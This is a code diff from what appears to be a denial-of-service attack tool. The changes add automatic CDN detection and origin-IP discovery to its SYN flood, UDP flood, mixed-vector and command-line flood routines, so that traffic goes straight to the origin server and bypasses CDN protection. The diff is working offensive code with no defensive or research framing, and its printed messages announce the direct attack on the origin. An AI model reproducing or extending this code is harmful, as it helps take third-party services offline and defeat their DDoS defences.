@@ -2120,7 +2120,7 @@ async def _run_python_flood(target: str, duration: int, threads: int, method_nam
     return {"total_requests": sent + failed, "completed": sent, "failed": failed, "timeout": 0, "elapsed": duration}
 
 async def run_syn_flood(target: str, cfg: dict):
-    """SYN / TCP Connection Flood with LIVE DASHBOARD"""
+    """SYN / TCP Connection Flood with LIVE DASHBOARD + Auto CDN Bypass"""
     duration = int(get_input(" Duration (seconds, default 30): ") or "30")
     rps = int(get_input(" Packets per second (default 5000): ") or "5000")
     threads = int(get_input(" Workers / concurrent (default 500): ") or "500")
@@ -2133,7 +2133,39 @@ async def run_syn_flood(target: str, cfg: dict):
             print(f" {c('r','[-]')} Cancelled.")
             return
     
+    # Auto-detect CDN and find origin IP
+    print(f"\n {c('c','[*]')} Checking for CDN protection...")
+    from core.recon.target_detector import auto_detect_target
+    profile = await auto_detect_target(target, verbose=False)
+    
+    origin_ip = None
+    if profile and profile.has_cdn:
+        print(f" {c('y','[!]')} CDN detected: {profile.cdn_provider or 'Unknown'}")
+        print(f" {c('c','[*]')} Searching for origin IP (bypass CDN)...")
+        
+        try:
+            from core.recon.origin.origin_finder import find_origin_ip
+            origin_result = await find_origin_ip(target, timeout=15)
+            if origin_result and origin_result.get("origin_ip"):
+                origin_ip = origin_result["origin_ip"]
+                print(f" {c('g','[+]')} Origin IP found: {origin_ip}")
+                print(f" {c('g','[+]')} Will attack origin directly (CDN bypass)")
+                target = origin_ip
+            else:
+                print(f" {c('r','[-]')} Origin IP not found")
+                print(f" {c('y','[!]')} L4 attacks won't work against CDN")
+                print(f" {c('y','[!]')} Recommendation: Use Module 9 (Auto Mode V5) for CDN targets")
+                confirm = get_input(" Continue anyway? (y/N): ").lower()
+                if confirm != "y":
+                    return
+        except Exception as e:
+            print(f" {c('r','[-]')} Origin search failed: {e}")
+    else:
+        print(f" {c('g','[+]')} No CDN detected - direct attack")
+    
     opts = await prompt_attack_options(target, ask_proxy=False)
+    if origin_ip and not opts["origin_ip"]:
+        opts["origin_ip"] = origin_ip
 
     print(f"\n {c('c','[*]')} TCP SYN Flood | {target} | {duration}s | {rps} PPS")
     if opts["origin_ip"]:
@@ -2176,7 +2208,7 @@ async def run_syn_flood(target: str, cfg: dict):
 
 
 async def run_udp_flood(target: str, cfg: dict):
-    """UDP Flood with LIVE DASHBOARD"""
+    """UDP Flood with LIVE DASHBOARD + Auto CDN Bypass"""
     duration = int(get_input(" Duration (seconds, default 30): ") or "30")
     rps = int(get_input(" Packets per second (default 5000): ") or "5000")
     threads = int(get_input(" Workers / concurrent (default 500): ") or "500")
@@ -2189,7 +2221,38 @@ async def run_udp_flood(target: str, cfg: dict):
             print(f" {c('r','[-]')} Cancelled.")
             return
     
+    # Auto-detect CDN and find origin IP
+    print(f"\n {c('c','[*]')} Checking for CDN protection...")
+    from core.recon.target_detector import auto_detect_target
+    profile = await auto_detect_target(target, verbose=False)
+    
+    origin_ip = None
+    if profile and profile.has_cdn:
+        print(f" {c('y','[!]')} CDN detected: {profile.cdn_provider or 'Unknown'}")
+        print(f" {c('c','[*]')} Searching for origin IP (bypass CDN)...")
+        
+        try:
+            from core.recon.origin.origin_finder import find_origin_ip
+            origin_result = await find_origin_ip(target, timeout=15)
+            if origin_result and origin_result.get("origin_ip"):
+                origin_ip = origin_result["origin_ip"]
+                print(f" {c('g','[+]')} Origin IP found: {origin_ip}")
+                print(f" {c('g','[+]')} Will attack origin directly (CDN bypass)")
+                target = origin_ip
+            else:
+                print(f" {c('r','[-]')} Origin IP not found")
+                print(f" {c('y','[!]')} L4 attacks won't work against CDN")
+                confirm = get_input(" Continue anyway? (y/N): ").lower()
+                if confirm != "y":
+                    return
+        except Exception as e:
+            print(f" {c('r','[-]')} Origin search failed: {e}")
+    else:
+        print(f" {c('g','[+]')} No CDN detected - direct attack")
+    
     opts = await prompt_attack_options(target, ask_proxy=False)
+    if origin_ip and not opts["origin_ip"]:
+        opts["origin_ip"] = origin_ip
 
     print(f"\n {c('c','[*]')} UDP Flood | {target} | {duration}s | {rps} PPS")
     if opts["origin_ip"]:
@@ -2281,9 +2344,34 @@ async def run_dns_amplification(target: str, cfg: dict):
 
 
 async def run_mixed_attack(target: str, cfg: dict):
-    """Mixed Attack v2 — ALL vectors via multi_vector_engine + AutoDashboard + origin bypass"""
+    """Mixed Attack v2 — ALL vectors via multi_vector_engine + AutoDashboard + origin bypass + Auto CDN Detection"""
     if not target.startswith(("http://", "https://")):
         target = "https://" + target
+
+    # Auto-detect CDN and find origin IP
+    print(f"\n {c('c','[*]')} Checking for CDN protection...")
+    from core.recon.target_detector import auto_detect_target
+    profile = await auto_detect_target(target, verbose=False)
+    
+    origin_ip = None
+    if profile and profile.has_cdn:
+        print(f" {c('y','[!]')} CDN detected: {profile.cdn_provider or 'Unknown'}")
+        print(f" {c('c','[*]')} Searching for origin IP (bypass CDN)...")
+        
+        try:
+            from core.recon.origin.origin_finder import find_origin_ip
+            origin_result = await find_origin_ip(target, timeout=15)
+            if origin_result and origin_result.get("origin_ip"):
+                origin_ip = origin_result["origin_ip"]
+                print(f" {c('g','[+]')} Origin IP found: {origin_ip}")
+                print(f" {c('g','[+]')} L4 vectors will target origin directly")
+            else:
+                print(f" {c('r','[-]')} Origin IP not found")
+                print(f" {c('y','[!]')} L4 vectors disabled, using L7 only")
+        except Exception as e:
+            print(f" {c('r','[-]')} Origin search failed: {e}")
+    else:
+        print(f" {c('g','[+]')} No CDN detected - direct attack")
 
     duration = int(get_input(" Duration (seconds, default 600): ") or "600")
     rps = int(get_input(" Total RPS (default 15000): ") or "15000")
@@ -4179,6 +4267,27 @@ async def cmd_start(args, cfg):
             url=target, duration=duration, method="slowloris", rps=rps
         )
     elif method == "syn-flood":
+        # Auto-detect CDN and find origin
+        print(f" {c('c','[*]')} Checking for CDN protection...")
+        profile = await auto_detect_target(target, verbose=False)
+        origin_ip = None
+        if profile and profile.has_cdn:
+            print(f" {c('y','[!]')} CDN detected: {profile.cdn_provider or 'Unknown'}")
+            print(f" {c('c','[*]')} Searching for origin IP...")
+            try:
+                from core.recon.origin.origin_finder import find_origin_ip
+                origin_result = await find_origin_ip(target, timeout=15)
+                if origin_result and origin_result.get("origin_ip"):
+                    origin_ip = origin_result["origin_ip"]
+                    print(f" {c('g','[+]')} Origin IP found: {origin_ip}")
+                    target = origin_ip
+                else:
+                    print(f" {c('r','[-]')} Origin IP not found - attack may fail against CDN")
+            except Exception as e:
+                print(f" {c('r','[-]')} Origin search failed: {e}")
+        else:
+            print(f" {c('g','[+]')} No CDN detected")
+        
         if IS_WINDOWS:
             from core.attack.engines.layer4_v5 import TcpConnectionFlood
             engine = TcpConnectionFlood()
@@ -4187,6 +4296,27 @@ async def cmd_start(args, cfg):
         else:
             result = await run_go_engine(target=target, duration=duration, rps=rps, method="syn-flood")
     elif method == "udp-flood":
+        # Auto-detect CDN and find origin
+        print(f" {c('c','[*]')} Checking for CDN protection...")
+        profile = await auto_detect_target(target, verbose=False)
+        origin_ip = None
+        if profile and profile.has_cdn:
+            print(f" {c('y','[!]')} CDN detected: {profile.cdn_provider or 'Unknown'}")
+            print(f" {c('c','[*]')} Searching for origin IP...")
+            try:
+                from core.recon.origin.origin_finder import find_origin_ip
+                origin_result = await find_origin_ip(target, timeout=15)
+                if origin_result and origin_result.get("origin_ip"):
+                    origin_ip = origin_result["origin_ip"]
+                    print(f" {c('g','[+]')} Origin IP found: {origin_ip}")
+                    target = origin_ip
+                else:
+                    print(f" {c('r','[-]')} Origin IP not found - attack may fail against CDN")
+            except Exception as e:
+                print(f" {c('r','[-]')} Origin search failed: {e}")
+        else:
+            print(f" {c('g','[+]')} No CDN detected")
+        
         if IS_WINDOWS:
             from core.attack.engines.layer4_v5 import UdpFloodV5
             engine = UdpFloodV5()
